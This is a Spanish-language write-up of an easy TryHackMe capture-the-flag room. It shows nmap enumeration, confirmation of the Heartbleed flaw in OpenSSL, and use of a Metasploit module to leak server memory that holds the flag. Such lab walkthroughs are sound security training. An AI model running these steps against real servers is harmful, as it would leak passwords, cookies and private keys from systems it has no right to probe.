
## Resumen

Máquina de TryHackMe de dificultad fácil en la que explotamos la vulnerabilidad **Heartbleed** (CVE-2014-0160) contra un servicio que usa OpenSSL. Esta vulnerabilidad permite leer trozos de la memoria del servidor, y en esa memoria aparece la flag.

## Enumeración

Empiezo con un ping para intentar deducir el sistema operativo a partir del TTL.

```bash
ping -c 1 <IP>
```

```text
64 bytes from <IP>: icmp_seq=1 ttl=253 time=31.2 ms
```

Con este TTL no puedo saber qué sistema operativo usa, así que sigo con nmap.

```bash
nmap -sVC -p- --min-rate 5000 <IP> -oN nmap
```

```text
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 35:8c:61:ac:54:91:0d:d8:24:ee:1e:7c:ea:88:58:88 (RSA)
|   256 b2:7a:d0:95:51:ba:91:43:3f:28:97:9f:9a:9e:ad:cc (ECDSA)
|_  256 9e:e3:6e:0f:c9:fe:93:10:77:7c:0c:96:73:7d:21:cc (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39373/tcp   status
|   100024  1          43463/udp6  status
|   100024  1          45596/udp   status
|_  100024  1          58177/tcp6  status
443/tcp   open  ssl/http nginx 1.15.7
|_http-server-header: nginx/1.15.7
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
|_http-title: What are you looking for?
| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Not valid before: 2019-02-16T10:41:14
|_Not valid after:  2020-02-16T10:41:14
39373/tcp open  status   1 (RPC #100024)
```

Puertos abiertos:

| Puerto | Servicio                         |
| ------ | -------------------------------- |
| 22     | SSH (OpenSSH 7.4)                |
| 111    | rpcbind                          |
| 443    | HTTPS (nginx 1.15.7 con OpenSSL) |
| 39373  | RPC                              |

El puerto 443 es el más interesante porque usa SSL/TLS, así que empiezo por ahí.

### Prueba de SSL

Miro qué protocolos y cifrados acepta el servicio, por si da alguna pista.

```bash
nmap --script ssl-enum-ciphers -p 443 <IP>
```

 

```nmap
PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers:
|   TLSv1.0:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_256_CBC_SHA (rsa 2048) - A
|     compressors:
|       NULL
|     cipher preference: client
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|   TLSv1.1:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_256_CBC_SHA (rsa 2048) - A
|     compressors:
|       NULL
|     cipher preference: client
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (secp256r1) - A
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_128_CBC_SHA256 (rsa 2048) - A
|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_CBC_SHA256 (rsa 2048) - A
|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_CAMELLIA_256_CBC_SHA (rsa 2048) - A
|     compressors:
|       NULL
|     cipher preference: client
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
```

 

Con esto solo veo los protocolos y cifrados que acepta (TLS 1.0, 1.1 y 1.2), pero **no la versión exacta de OpenSSL**. Así que ejecuto un script de nmap para comprobar directamente si es vulnerable a Heartbleed.

```bash
nmap --script ssl-heartbleed -p 443 <IP>
```

```text
PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
```

### ¿Qué es Heartbleed?

Es un fallo de OpenSSL (CVE-2014-0160) en la función _heartbeat_, que sirve para comprobar que la conexión sigue viva. El cliente manda un mensaje indicando su tamaño, pero el servidor no comprueba que ese tamaño sea real. Si el cliente miente y dice que es más grande de lo que es, el servidor responde con datos extra de su memoria (hasta 64 KB cada vez). Esa memoria puede contener contraseñas, cookies o incluso claves privadas.

Como el servicio es vulnerable, intento explotarlo.

## Explotación

Entro en Metasploit.

```bash
msfconsole
```

Busco la vulnerabilidad.

```text
msf > search heartbleed
```

Elijo el módulo `auxiliary/scanner/ssl/openssl_heartbleed` en este caso el numero 4.

```text
4  auxiliary/scanner/ssl/openssl_heartbleed    2014-04-07    normal    Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
```

```text
msf > use 4
```

Configuro la IP, el puerto y activo `verbose` para que muestre la memoria que se filtra.

```text
msf auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS <IP>
msf auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 443
msf auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
```

Ejecuto el módulo.

```text
msf auxiliary(scanner/ssl/openssl_heartbleed) > run
```

La salida trae mucha información sin interés (trozos de memoria del servidor) y, entre ella, aparece la flag.

```text
[*] <IP>:443 - Printable info leaked:
THM{REDACTED}
```


## Flujo de ataque

1. **Enumeración:** con nmap encuentro varios puertos abiertos y me centro en el 443, que usa OpenSSL.
2. **Comprobación de vulnerabilidad:** un script de nmap confirma que el servicio es vulnerable a Heartbleed.
3. **Explotación:** busco el módulo en Metasploit, lo configuro y al ejecutarlo consigo la flag.

 